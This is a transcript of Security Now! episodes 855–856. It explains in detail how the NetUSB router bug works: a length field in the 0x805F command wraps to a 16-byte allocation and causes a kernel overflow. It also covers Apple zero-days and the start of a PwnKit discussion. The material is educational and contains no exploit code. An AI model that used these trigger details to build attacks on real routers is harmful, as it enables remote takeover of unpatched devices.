Anyway, the point is that was then.  I've got lots more bandwidth now.  I'm at Level 3.  I've got a big fat pipe connecting my systems.  So I absolutely could do that.  The only thing I am lacking, famously, is the time to do it.  But if at some point in the future I get to a point where SpinRite is essentially done once again - although we know I've got a lot of work to do before I get to that point.  I'll get there.



When I get there, one of the things I would love to do is basically do a comprehensive port scan, every single port at a given IP.  It might take a while; but I agree, it would be really useful to be able to do that.  And I need to do that.  I also need to update everything to IPv6.  I get a lot of requests for the DNS Benchmark to be running IPv6, not just IPv4.  And that's still the most downloaded thing we've got is that benchmark, like 3,000 downloads a day, like endlessly.



And lastly, Dylan Anthony said:  "According to the author of cURL, it's not an RCE.  So you're not the only one who couldn't figure out why Microsoft categorized it as such last week."  Remember I was talking about the Patch Tuesday there were two open source projects, Libarchive and cURL.  And Microsoft had them both categorized as remote code execution.  And I said, no, you know, I could see a man-in-the-middle attack because this thing was about the kludge of using STARTTLS to bring up a secure connection when you were creating a cURL link to an email server that wouldn't be initially secure.  And it just seemed like, nah, I couldn't see how that was remote code execution.  And indeed it isn't one.



So I did some more examination of the NetUSB hack which reportedly, as we know, affects many millions of Internet-connected routers.  Last week when we first talked about it, I skipped over the techie details because there was so much else to talk about rather than just the nitty-gritty of the attack's actual mechanics.  But after spending some time looking into what went wrong with the code, I realized that not only would a full explanation of the flaw be well within our listeners' ability to grasp, but that it would serve as another very valuable example of precisely the way things go wrong with software and Internet security.  So what better thing to talk about on this podcast?



One thing I should note is that this flaw is incredibly widespread.  The tiny list of router vendors that I shared last week from the guys who found this flaw should not provide anyone with any solace.  If your router has a USB connection port, you really do need to make absolutely certain that it's not listening on its WAN interface port 20005.



And as you said, Leo, at the top of the show, your memory was exactly right.  This is not the first time that KCodes Technology, the Taiwanese developer and licensor of the NetUSB technology, has had trouble.  This Security Now! podcast Episode 509, recorded May 26th, 2015, nearly seven years ago, was titled "The NetUSB Bug."  You know, it should have been Part 1 because here we are again.  And that bug was a biggie, too.  And perhaps because, I don't know, maybe because we were all seven years less jaded then by the endless parade of vulnerabilities that we've been subjected to than we are today, there was more attention paid to the breadth and scope of the trouble than there seems to be now.  It feels to me as though maybe today's tech press got one headlined page out of the story, then went back to wondering what NFTs are and, you know, what they should have to say about them.



That earlier vulnerability, which was found in the same NetUSB kernel module as the current one, was discovered by a group called SEC Consult.  At the time they wrote:  "NetUSB suffers from a remotely exploitable kernel stack buffer overflow.  Because of insufficient input validation, an overly long computer name can be used to overflow the computer name" - I know, Leo.  I know.



LEO:  Okay.



STEVE:  "...can be used to overflow the 'computer name' kernel stack buffer.  This results in memory corruption which can be turned into arbitrary remote code execution.  Furthermore, a more detailed summary of this advisory has been published at our blog."  And then I've got the link for anyone who's curious.  So, yeah.  Insufficient input validation.  When you don't look at how long the name is, and you just stick it in the buffer.



LEO:  I don't know why anybody would name their computer more than five letters.



STEVE:  No.



LEO:  It just doesn't seem sensible.



STEVE:  Too much to type.  And at the time these guys provided a benign proof of concept which simply crashed the targeted router.  In their disclosure under vulnerable and tested versions they wrote, they said:  "The vulnerability has been verified to exist in most recent firmware versions of the following devices:  TP-Link TL-WDR4300 V1 and the TP-Link WR1043ND v2, and the Netgear WNDR4500."  Just those three.  But then they added that they had identified NetUSB as being present in the most recent firmware version of the following products, noting that the list they were providing was not necessarily complete.  Okay.  And everyone will thank me for not reading that list because there are truly too many for me to read.  So I shortened the list for the podcast.  But I wanted to give everyone a feel for it.



In the list was the D-Link DIR-615C, then 42 different Netgear router models, 40 different TP-LINK models, 14 TrendNet models, and four Zyxel routers.  And they added that:  "Based on information embedded in KCodes drivers," they said, "we believe the following vendors are affected:  Allnet, Ambir Technology, AMIT, Asante, Atlantis, Corega, Digitus, D-Link, Edimax, Encore Electronics, Engenius, Etop, Hardlink, Hawking, IOGEAR, LevelOne, Longshine, Netgear, PCI, PROLiNK, Sitecom, Taifa, TP-LINK, TrendNet, Western Digital, and Zyxel."



In other words, this one company appears to have cornered the market on, and they do claim to have patents on, extending USB links across consumer WiFi to router USB ports.  And although that was seven years ago, there is no reason to believe that any router using USB extension today is not using KCodes' troublesome technology.  In fact, there is a project called USB/IP which DD-WRT uses.  It's the only one I know of that is doing USB/IP and not using this KCodes technology.  So again, I mean, all of those companies just license the stuff from KCodes, and thus they all have this problem.



SEC Consult's original write-up provided a full responsible disclosure timeline, and I looked at it.  It would be charitable to say that KCodes Technology was unresponsive, that is, the company, when SEC Consult tried to contact them seven years ago and said, hey, guys, you've got a problem here with long computer names that is really bad.  Silence.



So SEC Consult finally disclosed what they had found to the CERT Coordination Center back then and directly to several of the major, most seriously affected router vendors.  After speaking with a few of the gazillion vendors, they wrote:  "Sometimes NetUSB can be disabled via the web interface, but at least on Netgear devices this does not mitigate the vulnerability.  Netgear told us that there is no workaround available.  The TCP port cannot be firewalled, nor is there a way to disable the service on their devices."



And of course finally, as is inevitable, more so today than seven years ago, a fully weaponized exploit was published, and it's archived on GitHub.  I grabbed a chunk of the boilerplate at the top of the Python script.  The author said:  "This is a weaponized exploit for the NetUSB kernel vulnerability discovered by SEC Consult."  The hacker author says:  "I don't like lazy vendors.  I've seen some DoS PoCs floating around for this bug," you know, meaning proof of concepts that just crashed the router.  He says:  "And it's been almost five months.  So let's kick it up a notch with an actual proof of concept that yields code execution.  So anyway, a remotely exploitable kernel vulnerability.  Exciting, eh?"  And then he says:  "Smash stack, ROP" - meaning return-oriented programming - "decode, stage, spawn userland process.  Whoo."



He says:  "Currently this is weaponized for one target device," he says, "the one I own."  He said:  "I was planning on porting OpenWRT, but got sidetracked by the NetUSB stuff in the default firmware image."  Anyway, the point was he was going to replace whatever device he had which had the NetUSB vulnerability with OpenWRT instead, and that would be good, but he got a little sidetracked.  He said:  "Oh, I'm going to weaponize the NetUSB bug before I remove the firmware from my hardware."



Anyway, it's there.  It's seven years old.  And here we are again today.  That was then.  But I think it provides some important context for today.  I wanted to be certain that everyone understood that many, many more than five or six router vendors were involved, and that KCodes Technology has in the past been anything but helpful and responsible in the way they've acted.



The guys who discovered today's problem understood that the only possible way to get all of the routers whose manufacturers had licensed the common NetUSB code updated would be to contact KCodes Technology.  And as we know, in the past that hasn't turned out so well.  Although the guys at Sentinel Labs, the people who found what we're talking about today, deliberately stopped short of providing anything beyond a simple denial of service proof of concept, you know, crash and reboot the router, there is every reason, in fact much more in today's climate than there was seven years ago, to expect that someone is going to weaponize this exploit, if it hasn't already been done by the time we're recording today's podcast.  It is too pervasive; and it is, as we're going to see, too simple.  There is nothing left to the imagination here.



The Asus router that I use at my other location does not offer NetUSB functions.  Asus never has.  And even if it did, it's daisy-chained, as I mentioned, behind another little router, the Protectli router running pfSense.  So no ports that the Asus might have open would have been exposed to the Internet anyway.  I use pfSense to perform port translation in order to get around some annoying Cox port filtering, which they're doing for the benefit of normal people.



Okay.  So now that I have everyone's attention, let's take a look inside KCodes' technology to see what they messed up.  To initiate a connection with the router, any PC located on the LAN initiates a TCP connection to the router's port 20005.  The router's kernel service and server listening for those incoming connections should only be listening on the router's LAN interface.  But as we know from last week, the worst aspect of the flaw is that the NetUSB service is bound to 0.0.0.0 on the TCP/IP stack, giving it a presence on both the router's LAN and WAN interfaces, and thus exposing it to the public Internet.  It would still be a problem to have this vulnerable service, if only on the LAN, since anyone on the LAN, like in an enterprise environment, where maybe you don't trust everybody, could potentially take over the router without authorization and authentication.  But allowing it to happen with anyone, anywhere, meaning on the WAN, definitely takes it up a notch.



Okay.  So once the standard three-way TCP connection handshake has occurred, the PC wishing to have access to the USB devices connected to the router sends a signature plus 16 bytes (128-bits) of what they term "Verify Data."  It appears that these 16 bytes of so-called "Verify Data" serves as a connection nonce to prevent replay attacks.  Right, just the PC gets 16 bytes, 128 bits, of random stuff and says, you know, this is how I'm going to tag this conversation. 



Upon receiving the PC's signature with its "Verify Data," the router AES-encrypts that "Verify Data" and returns it along with its own 16 bytes of "Random Data."  And, you know, the PC probably decrypts the AES-encrypted "Verify Data" that it sent and got from the client to verify that it matches.  So basically each end sends the other a large random nonce which they each encrypt and send back so that the other end can decrypt it and verify it.  So they establish a replay-proof verification of the two endpoints.



Assuming that everything works, it then gets ready to take the next step.  They've exchanged this nonce data.  The router's code then drops into, having established this connection, a command-parsing loop, a so-called "while-loop," to await the PC client's commands.  So everything is being driven by information now being sent by the PC that has connected to the router.  And of course this could also be anybody anywhere on the Internet in the case of this service being exposed on the WAN.  And I mentioned this is a while-loop.  There is probably a command that exits that loop.  That is, so that the loop will sit there accepting and processing commands from the client that is connected to the router until a hang-up command is received, which drops it out the loop and terminates the connection.



Anyway, this loop waits for and receives a 16-bit command word which causes it to jump to a function which then further handles the needs of each specific command.  So that's sort of a simple way of executing or implementing a command-driven protocol.  You have a 2-byte 16-bit command which the router will receive, and that causes it then to branch, you know,  you would call it a switch function.  The command would cause it to call a specific subroutine to process the rest of that command.  



The researchers at Sentinel Labs found a problem in the function whose 16-bit command is hexadecimal 805F.  So the receipt of that 16 bits as the command word 805F branches the code to a specific routine named "SoftwareBus_dispatch Normal EP Msg Out."  And doesn't really matter what that does.  That's not germane.  Whatever it does, fine.  We don't need to know or care.  So the client first sends that command.  Then it sends 4 bytes, which is of course 32 bits, to be the maximum number of bytes to follow, which will be read from the client.  And, okay, that's clean since the client is declaring upfront the number of bytes that it will be sending in this 4-byte 32-bit value.  This allows the receiving server, the router, to request an allocation of memory from the underlying operating system.  Basically it says I need a buffer which will be used to receive and hold up to that much data received from the client.



And whatever that function is doing, 17 bytes of additional, you know, we could just call it scratchpad working memory space is apparently also required to process the command.  So to the size of the memory allocation being requested, the function adds 17 so that an extra 17 bytes of memory will be obtained from the operating system for the function to use.  That all seems great.



Okay.  So to recap, the client sends the hex command code 805F, which is then followed by 4 bytes to indicate the amount of follow-on data that the client will be sending and that the router should be ready to accept.  And upon receiving those 4 bytes it allocates memory to serve as a buffer into which to receive the client's data.  And the server asks the operating system for that much plus 17 bytes more, so that it has a little bit of extra memory to use for whatever it's doing.  After that, the code calls a data receiving function, giving it a pointer to the buffer which it's received from the operating system's allocation and the number of bytes that the client said would be forthcoming to fill that buffer.



The data receive function will receive data from the client, placing that data into the buffer that's been pre-allocated to contain it, until the specified number of bytes of data has been received.  Once the expected count of data is received, the data receive function will return to its caller with the buffer filled with the expected data, and those 17 extra bytes at the end for the command processor to use.



Okay.  This is all perfectly reasonable code.  You could stare at that code all day long and find nothing to criticize.  There's no way for the sender to overflow the receiving buffer, since the sender pre-declares the number of bytes that it will be sending, and that's all that the data receive function will accept.  After it's got that many, it says okay, done, and returns to its caller.  Upon receiving the 4-byte data size, an allocation of that amount plus 17 extra bytes is requested from the operating system.  Upon the successful allocation of a buffer to hold the incoming data, the data receive function is told how many bytes to accept, and it does.



So what's the problem?  What is it that the clever researchers at Sentinel Labs found?  As we know, the sending client specifies its byte count as a 4-byte 32-bit integer.  So it's reasonable to store that byte count in a 4-byte 32-bit integer. The authors correctly declare the integer, that is, the original authors of the code, declare the integer as unsigned because a byte count should logically be unsigned; right?  You can't have a negative byte count.  That doesn't make any sense.  So that's fine.  The problem arises when those 17 extra bytes are added to the memory allocation.  The largest value that a 32-bit unsigned integer can represent is that old familiar number just shy of 4.3 billion, you know, like the same as the number of IPv4 IP addresses, you know, 2^32-1.  That's the largest number that will fit in 32 bits.



So what happens if a malicious client connects to this router's port 20005, properly negotiates a handshake, then sends that vulnerable command code 805F to tell it which command it wants to execute, and for the count of the bytes it's going to send, it declares that maximum value of 4.3 billion?  In binary, that's all ones, the largest number that can be represented in 32 bits.



So, okay, the command processing code needs to allocate a buffer from the operating system to contain that many bytes of data.  As before, it adds 17 to accommodate its small bit of extra scratchpad working memory.  But now, adding 17 to a 32-bit value that is already as large as it can possibly be will cause the addition to overflow, and the value to wrap back around.  To make that clear, if we were to add one to the 32-bit value that's all ones, the count would wrap around, as it's called, back to zero.  But we add 17, so the count will wrap around to 16.  And that 16 is the number of bytes this code then asks the operating system to allocate for us to hold the data that the client is about to send.



So the operating system does that.  It allocates 16 bytes, which is what we told it we wanted.  We receive a pointer to a 16-byte buffer, which we then hand to the data receive function, asking it to please receive the original byte count of 4.3 billion bytes of client data, which it dutifully begins to do.  And what we have is a textbook perfect classic buffer overflow, where the client has absolute and total control over the contents that fills and then overflows the tiny 16 bytes of data buffer.



Without any additional work, that will immediately crash the router, probably causing it to reboot.  But with the addition of some skilled hacking, it's quite clear that many, many millions of consumer routers are exposed to a very critical and extremely exploitable remote code execution attack where the attacker is readily able to supply the code that they want to send.  Just, I mean, just a perfect example of a simple-to-make mistake.  Nothing looked wrong about it.  The logic of the flow was well thought out.  Let's provide the byte count upfront.  We'll get that many bytes plus a little extra that we need from the operating system.  We'll hand that byte count to the receive function that will only receive up to that many bytes, so the buffer can't overflow.  Once it's got that many, it'll come back to us, and we'll do whatever we want to with it.  The problem, of course, is that they hit a wraparound, and 16 bytes were allocated rather than the amount declared plus 17.



So there are several points of failure evidenced in the design of the code.  For one thing, though we don't know what command 805F does, it does seem quite unlikely that telling it that it's about to receive 4.3 billion bytes of data would be unreasonable.



LEO:  Yeah, no kidding.



STEVE:  You know, it's like, what?  No.



LEO:  Get ready.  Here come some gigs.



STEVE:  So for all we know, the most that would ever really normally be sent is some packet of something; right?  Maybe a few K, a few Kbytes at a time.  Obviously the router's got to have memory to hold it, to allocate a buffer for it, so it's not going to be big.  Yet that command performs no sanity checking of any kind of what that forthcoming bytes size is.  If it's 4.3 billion, fine.  Come on.  Bring it on.



We've often talked about this problem which affects the designers of interpreters.  They assume, as the designers of this code that we're looking at now must have, that only a valid client would ever be connecting to their server.  After all, they probably wrote the other end, the drivers in the PC that are going to be connecting to their server.  So they never bothered to place any sanity-checking limits, even really high-end, like this could never happen, so abort this, or anything.  They just accept whatever the client will send.



If the machine had been 64 bits rather than 32 bits, adding 17 to a maximum 4-byte value would not have wrapped around, and the operating system would have been asked to allocate 4.3 gig of RAM, plus 17 bytes, which it would surely have balked at, failed the allocation request, and thus protected the router from any attack.  But our little consumer routers are using inexpensive 32-bit MIPS chips, so 32 bits is going to wrap around back to zero and then some.



As a consequence of this pervasive bug, we can expect that a lot of damage will be done to users whose routers have aged out of their service life, or who have manufacturers or users who are not paying attention to what's going on.  Fortunately, everyone here is.  



LEO:  Okay, well, there you go.  Sanitize your inputs, kids.  I guess that's always the motto. 



STEVE:  Well, or, yes, exactly.  Sanitize anything you accept from an untrusted source.



LEO:  Or any source, yeah.



STEVE:  Anybody connecting to you over TCP.  It's like, okay, I don't know who that is.



LEO:  Interesting.  Yeah, that's right, yeah.



STEVE:  Yeah.



LEO:  Somebody said you should be a professor.  You teach very well.  I agree.  You want to share this with your friends, tell them it's called Security Now!, and you can get it in many places.  We'll start with Steve's site, GRC.com.  He has 16Kb audio versions, 64Kb audio versions.  He's got transcripts, too, which emerge a couple of days after the show.  That's a great way to read along as you listen or to search and find a part that you're particularly interested in.  Say you wanted to find the last NetUSB exploit.  You could find that by doing a little search.  He also has SpinRite.  I wanted to say SpinRite.  I mixed SpinRite and ShieldsUP!.  He's got ShieldsRite.  He's got ShieldsUP!, which is free.



STEVE:  And SpinUP.



LEO:  And SpinUP.  SpinRite, which is the world's finest mass storage maintenance and recovery utility.  SpinRite is his bread and butter.  So go over there and buy a copy.  It's not expensive, given what you get.  And if you buy it now, you'll get a free upgrade to v6.1, which is in process.  You get to participate in the development of it and all that, too.  GRC.com.  You can leave feedback at GRC.com/feedback.  Or better yet, go to his Twitter.  His DMs are open.  He's @SGgrc.  That's another good way to leave him pictures and suggestions and questions and so forth.



We have the show on our website, as well, TWiT.tv/sn.  We've got 64Kb audio.  We also have video of the show.  You can download those.  There's a YouTube channel dedicated to the show.  You can also subscribe in your favorite podcast client and automatically get every version as soon as it's sent out.  Now, people sometimes ask, well, I want all the shows, all 855 of them.  We're not going to put 855 shows in an RSS feed.  It would be more than 4.3 billion bytes.  It would be big.  So we just put the most recent 10 shows.



If you want more than that, you can get them from Steve's site, or you can get them from our site.  Both of us have every show since Episode 1 available for download there.  And there are people have written scripts and so forth that will automatically get them.  But, you know, I'll leave that as an exercise for the reader.  Thank you, Steve.  We'll see you next Tuesday at 1:30 Pacific, 4:30 Eastern, 21:30 UTC.



STEVE:  February 1st.



LEO:  February 1st.



STEVE:  Thanks, buddy.  Bye.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.










GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#856

DATE:		February 1, 2022

TITLE:		The "Topics" API

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-856.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This is another of those weeks where we're going to go deeper into fewer topics rather than broader across more topics, with Google's newly announced and explained "Topics" API of course being our title story.  So we'll start by looking at "PwnKit," which is a startling and longstanding local privilege escalation vulnerability which has existed in every distribution of Linux since May of 2009.  It's a MUST PATCH for Linux systems.  We'll then look at another of the blessedly few Log4j exploits which is actually happening, update on two new Zerodium limited-time bounty "offers," and at a new means for fingerprinting web browsers.  I have a totally random bit of miscellany to share in the form of a tip, a SpinRite update, and some closing-the-loop feedback from our terrific listeners.  Then we'll wrap up by taking a really interesting deep dive into Google's new ad-targeting "Topics" API.



SHOW TEASE:  Coming up on Security Now! this week, it's me, Jason Howell, filling in for Leo.  I'm sitting in of course with the Explainer-in-Chief Steve Gibson.  This is a fascinating show.  You've got to watch and listen.  Details, a must-patch for Linux systems.  It's a doozy.  Definitely want to find out more about that.  Also a look at Zerodium's two new bounty offers and what that actually means.  A new way of fingerprinting web browsers.  And, finally, the big topic, no pun intended.  Steve breaks down Google's replacement for the recently axed FLoC service.  That is the Topics API, and I guarantee you you're going to understand Topics way more.  You might actually like it, too.  Steve Gibson explains it next on Security Now!.



JASON HOWELL:  This is Security Now! with Steve Gibson, Episode 856, recorded Tuesday, February 1st, 2022:  The Topics API.



It's time for Security Now!, the show where every week we talk about the latest security news with none other than - I like how Leo introduces you, the Explainer-in-Chief, so I'm going to go ahead and adopt that today.  Steve Gibson.  How's it going, Steve?



STEVE GIBSON:  Actually, it's probably apropos for today.  This is another of those weeks where we're going to go deeper into fewer topics rather than broader across more topics.



JASON:  Yeah.



STEVE:  So there'll be a lot of explaining-in-chiefing happening.  Last week Google sort of officially announced that they were throwing in the towel on FLoC, which, you know, we covered it.  I'm always interested in the technology underpinning all these things.  So that was the Federated Learning of Cohorts.  And it didn't take long for someone to point out that the learning was not actually federated.  And Google said, yeah, but we needed an F for, you know, to have a bird theme.  So anyway, it was downhill from there.  Nobody liked it.  It produced this mysterious cryptic token that meant nothing to anyone unless you knew, unless you had huge visibility into the Internet, like an advertiser who was advertising across a huge number of sites would have.  So it was inaccessible.  It was opaque.



And the other thing we've seen, too, is that when things are complicated, people just go, heh?  Like we talked about at the beginning of COVID, Apple and Google  joined up to produce this really cool, has my "i" or Android device been in proximity to somebody else who later and recently said that they got COVID?  Well, the technology was perfect.  I mean, they just nailed it.  But unfortunately it was complicated.  And so people were like, we don't like it.



JASON:  I haven't gotten a single one of those.  Yeah, I haven't received a single one of those.  And I have to imagine at some point in the last year and some odd time that I've been running that thing I crossed paths with somebody.



STEVE:  Well, in fact, I recently turned it off because I looked at my battery log, because now we have an itemized log of who's sucking up whose juice, and I had the tracking thing turned on, it was like totally dominating by about four times bigger than anything else, all the battery power.



JASON:  Wow.



STEVE:  So I thought, well, okay, first of all, I've also never had such an alert.  And it's like sitting here using up all my power.  But the point was people, because they couldn't understand it, they just decided, oh, it's a privacy invasion.  No.  I mean, it's like it's really not.  But it's like, okay, it's too complicated.  It's probably a privacy invasion.



So we're going to talk today about the Topics API, Google's  next-generation solution.  And it wins for all of those reasons where FLoC flopped.  It is completely transparent and so not at all opaque.  And the user can see what their browser is saying about them.  Anyway, we'll get into all that in detail.  And I'm going to have to tell Leo, like when he's back, that he needs to listen to this part of today's podcast because, you know, he was also on vacation when Tom and I did the bitcoin blockchain.  And Leo missed that, and it was an important piece of stuff for him to get.  And so I think this is, too.  To me, it feels like Google has decided, okay, tracking is going to go away, but we still want ad targeting.  We can have that without tracking.  And this to me feels like they want this one to succeed.  Whereas I don't know where FLoC came from, or where the FLoC it came from.  Anyway, we're going to end with that.



We've going to start by looking at, oh my goodness, PwnKit, which is a startling and longstanding local privilege escalation vulnerability which has existed in every distro of Linux since May of 2009.  So like it's a must-patch for Linux systems.  Not remotely exploitable, local only.  But we know that if something  gets into your system, we're relying on the containment of privileges within an operating system to keep it from setting itself up permanently as root and doing things that way.  This makes it easy.  I mean, anyway, we're going to have fun with that.



We're also going to take a look at the blessedly few, another one of the blessedly few Log4j exploits and talk about why we didn't see a big tsunami of them when that was announced in December.  I want to update on two new Zerodium limited-time bounty "offers," and I have that in quotes because Zerodium just rubs me the wrong way.  You know, the idea that they're buying  things to resell for use in attacking people just sort of seems  wrong.  And there's a new means for fingerprinting web browsers.  I've got a little bit of totally random miscellany, some feedback from our listeners, an update on SpinRite, and then we're going to talk about Topics.  So looks like we have plenty to talk about.



JASON:  Yeah, exactly.  And honestly, you were setting it up as like a few things.  But more expansion and..  



STEVE:  Yeah, I thought, well, I guess that's more than I thought.



JASON:  I think it's jam-packed.  I think that, yeah, this is a sandwich that is oozing ingredients.  And we're going to get to all this stuff, as it is each and every week.  I really appreciate what you do because you help me understand a lot of this stuff that sometimes just flies over my head otherwise.  So thank you, Steve, in advance.  All right.  We've got a Picture of the Week.  What am I looking at here?



STEVE:  So we're looking at, oddly, a little bit of my assembly language coding.  Leo and I have been talking for the last few weeks about coding more than usual.  And in fact some of the topics for today, this crazy flaw that was found in Linux distros is a little code-centric.  Anyway, I was looking up some code for somebody who wanted to implement SQRL on a platform that didn't have the encryption that SQRL uses, AES-GCM.  And I had written my own, and I had a C implementation of it.  But he was looking in the wrong directory.  Either I moved it, or it was written down wrong somewhere.  Anyway, when I was there I encountered this.  And I thought, oh, this would be fun just to show.



We were talking about how I believe it's important that code not only be understandable by the computer, but be as understandable to a human because you're writing code today which you hopefully inherently understand.  But invariably, if the code has any life to it, you're going to be coming back to it sometime in the future and need to re-understand it.  And maybe when you're 20 that's just like you never forgot it in the first place.  But when you're in your 60s it's like, okay, what was I thinking?  So it becomes a little more important to be clear.  Anyway, this is - I had also mentioned to Leo that I enjoyed solving the same problem over and over and over, just because I so much love the craft of code writing.



And so what this is, is the implementation of a binary search algorithm which was one of the first things I wrote for SQRL.  I wanted SQRL to have a multilingual user interface.  So throughout SQRL, throughout the SQRL code, when I need a string for a control or for a dialog box or something, I get the pointer to it using an index.  So that means that I need - oh, and the index are just sort of assigned at random.  So I needed a way of looking up an index, looking up the string that the index refers to.



So it's a dictionary.  And a dictionary is actually a perfect example because in the dictionary the words are alphabetical.  That's the guarantee you have.  But they're not evenly spaced.  That is, there's a word A, maybe there's AA.  But, for example, not all possible letter combinations are in the dictionary.  Only the letter combinations for words.  Which means that you cannot go instantly to the location where the word is in the dictionary; right?  And when you think about it, we don't.  We open the dictionary and see where we are.  And because we understand alphabetization, alphabetic sorting...



JASON:  Alphabetization?  Alphabetic sorting, there we go.



STEVE:  Alphabet sorting.  We know whether we opened it too soon or too late for the word we're looking for.  So then we'll, like, guess based on what word we see where we know which direction we go in.  So we open again.  And so through a succession of those guesses going on either the left or the right of the pages, we ultimately find the word we're looking for.



Okay.  So in computer science there is a - people who thought about this a long time ago said, okay, the way to do this optimally, if you have some long list of things which are sorted, but it's not a full list, that is, it isn't one, two, three, four, five, six, seven, eight, nine, 10.  If it were, with a computer, if you wanted number five, you just go to fifth one.  Instead it's one, 11, 17, 27, 56, 102, the idea being they're sorted numerically, but it's a sparse filling of numbers within that range.



Okay.  So we know how to solve this from a computer science standpoint.  You have this long list.  You go to the entry in the middle.  And you ask the question, is this bigger or smaller than the one I'm looking for?  If what you found is smaller, that means that the thing you want is below where you went; right?  Because you're trying to find a bigger one.  If what you found is larger than what you're looking for, then you go earlier because you want to find a smaller one.



The point is you always - it's called a binary search because you always divide the search space in half.  You jump into the middle.  Then that tells you whether you should go to either direction.  You always go half that distance in the proper direction and check again to see whether you're above or below.  Then you go half that distance in the proper direction, depending upon whether you're above or below again.  And you keep halving the distance and going and jumping in the right direction until you land on the one you're looking for.  You're guaranteed to always land on the one you're looking for, and it is given a random item that you're searching for.  It is always the optimal search.  That is, the average is you can't do any better than a binary search.



So the point is that this is that this little, beautiful - if I do say so myself - snippet of code does that.  And so for anyone who's curious to see what my assembly code looks like, there's a sample.  It's well commented because I want to be able to understand what I was thinking when I wrote the code the first time. 



JASON:  Yeah, very well commented.  That's what I'm realizing because I don't understand anything I'm looking at.  I'm like, at least it's documented top to bottom.



STEVE:  Yeah, yeah.  And Jason, you have a pulse.  You could probably, if you stared at this for a while, you'd go, okay, I kind of see what's happening there.  Anyway, so that's our picture of the week.



JASON:  Right on.  That's beautiful, beautiful code.



STEVE:  Thank you.  Apple has eliminated a couple zero-days from iOS and macOS.  I just wanted to make sure everyone knew, not that it's a big problem because these days zero-days are only being used in targeted attacks because they are - anyone who has one, who has some way of installing some malware on someone's phone, like Pegasus spyware on iOS devices, absolutely never wants it to be discovered.  They want to be able to use it as long as they possibly can.  So they're not going to spray everybody with it.  They're just going to only install it into the phones of some particularly annoying journalists, for example, if you're some government.



Anyway, last Wednesday Apple released iOS 15.3 and macOS Monterey 12.2, which included fixes for two zero-day vulnerabilities.  One was publicly disclosed and the other was being exploited in the wild by attackers to break into iPhones, iPads, and Macs.  These are the first zero-days patched by Apple in 2022, though as we know, Apple was patching a continuous stream of zero-day bugs throughout 2021 as it was trying to stay ahead of the NSO group and their Pegasus spyware, which kept getting installed in people's phones despite Apple's best efforts.



And Leo and I talked about this before.  There seems to be, like, as many as you need.  So who knows what kind of a storehouse the bad guys have.  Apple kills off one, and that doesn't slow these guys down.  But you still have to keep killing them off.  



The zero-day was tracked, as one of the two, tracked as CVE-2022-22587, which stemmed from a memory corruption issue in the IOMobileFramebuffer component that could be abused by a malicious application to execute arbitrary code with kernel privileges.  That's never good.  And it's worth noting that this is the third zero-day discovered in the IOMobileFramebuffer module within the past six months.  Last year Apple fixed two others, one in December and one earlier in the year.  Also Apple resolved four other weaknesses in that kernel extension that's used to manage the screen's framebuffer.  So this one seems to be some code they need to take a look at closely because it's being apparently a rich source of targets for the bad guys.



As for it being a zero-day, Apple said - and you know they never say very much.  They said they're "aware of a report that this issue may have been actively exploited," which means yeah, it was, and added that it had addressed the issue with improved input validation.  Apple did not reveal anything more about the nature of the attacks, as they generally don't, how widespread they are or the identities of the threat actors that were known to be exploiting them.



The other problem was a privacy-defeating bug in Safari, which was also eliminated.  That one was the result of bugs in the implementation of the IndexedDB API, and that was assigned CVE-2022-22594, which could be abused by malicious websites to track users' online activity in Safari and also to reveal their identity.  That one had been publicized by researchers at FingerprintJS as a WebKit flaw affecting macOS, iOS, and iPadOS.  Its exploitation allows a snooping website to discover information about other tabs a user might have open.  And of course inter-tab privacy can be important.  You might be logged into your banking website on another tab and not want some sketchy site you're visiting on a different tab to have any access to the tab you've got open in your online web banking.



Anyway, that bug, as it sounds, is a cross-origin policy violation in that IndexedDB API which is - the IndexedDB API is a JavaScript API provided by web browsers to manage a NoSQL - I keep saying SQRL when I see SQL.  No, Steve, that's not SQRL - a NoSQL database of, and this is where I think of you, the JSON objects.



JASON:  Thank you.



STEVE:  Uh-huh.  Apple closed this loophole by improving the API's input validation.  So anyway, when I saw this and opened up my phone and went to general settings, I was still back on 15.2.1.  And it's been a week.  So as often seems to be the case, Apple's not in a big rush to push this out.  Again, I don't think anybody's in great jeopardy from this.  Maybe that cross-tab thing, if you're a Safari user on iOS.  That might be worth dealing with.  Anyway, you may have to go there and look to see what version you have to sort of wake up iOS.  And it'll go, oh, we've got 15.3 ready.  Would you like it?  And so, yeah.  Yeah, you know, takes - and actually the update was pretty quick.  It only took a few minutes.  It wasn't one of those where the phone was down all day.  So, yeah, I would say update your Apple devices.  It's always a good thing to do.



Okay.  Here's one of our two big fun ones this week.  If Google's big reveal last week of this proposed Topics API hadn't seemed like such a potentially significant event for the industry, Qualys's disclosure that same day of an absolutely pervasive, longstanding, and readily exploited local privilege escalation vulnerability affecting every major Linux distribution  and it's being referred to as an attacker's dream come true.  If it hadn't been for Google basically stealing the topic of this podcast, that would have been the title story, this would have been the title story of the week, so-called "PwnKit," P-W-N-K-I-T.  Fortunately, we have time to discuss both.  And this one is really interesting.



Okay.  So the Qualys Research Team discovered a memory - okay.  It's being kind to call this a memory corruption vulnerability, as we'll see.  They discovered a memory corruption vulnerability in Polkit's pkexec command, which is an SUID-root program, which I'll explain in a second, which is installed by default in every major Linux distribution.  An SUID-root program is one which has its special SUID permission bit set on its file in the file system which causes the operating system to run it under the permissions of its owner, rather than the user who is invoking it.



And so an SUID-root program means that it is owned by the root account.  And these permissions are, you know, anyone who's seen Linux - and I know you, Jason, as an Android person are probably familiar with the way the file system looks.  You have read, write, and execute bits for the owner, the group, and the object itself.  And one of those status bits can be S as opposed to X so that it says this is executable, and when you execute it, operating system, run it under its owner account rather than the user.



Anyway, the point is this is a very powerful and dangerous permission for something to have.  Since pkexec's owner is the root account, that gives it a lot of power.  But actually the point of it is that it needs to have that power.  That is, the thing you do with it is about that.  But it turns out that there's an easily exploitable vulnerability in this program which allows any unprivileged user to gain full root privileges for themselves on any vulnerable host by exploiting this vulnerability in its default configuration with 100% reliability.



